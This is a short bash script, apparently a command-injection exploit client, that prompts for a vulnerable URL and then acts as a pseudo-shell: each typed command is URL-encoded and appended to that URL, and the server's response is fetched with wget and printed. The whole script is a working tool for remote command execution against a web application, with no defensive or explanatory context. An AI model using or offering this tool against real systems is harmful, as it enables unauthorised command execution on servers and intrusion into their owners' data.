#!/bin/bash
echo -n "enter vuln url: "
read a
while true 
echo -n "$ "
do read i
e=$(sed 's/\ /\%20/g' <<<$i)
b=$(sed 's/\;/\%3B/g' <<<$e)
f=$a$b
echo "* --> * --> " $f " <-- * <-- *"
wget -qO - $f
done
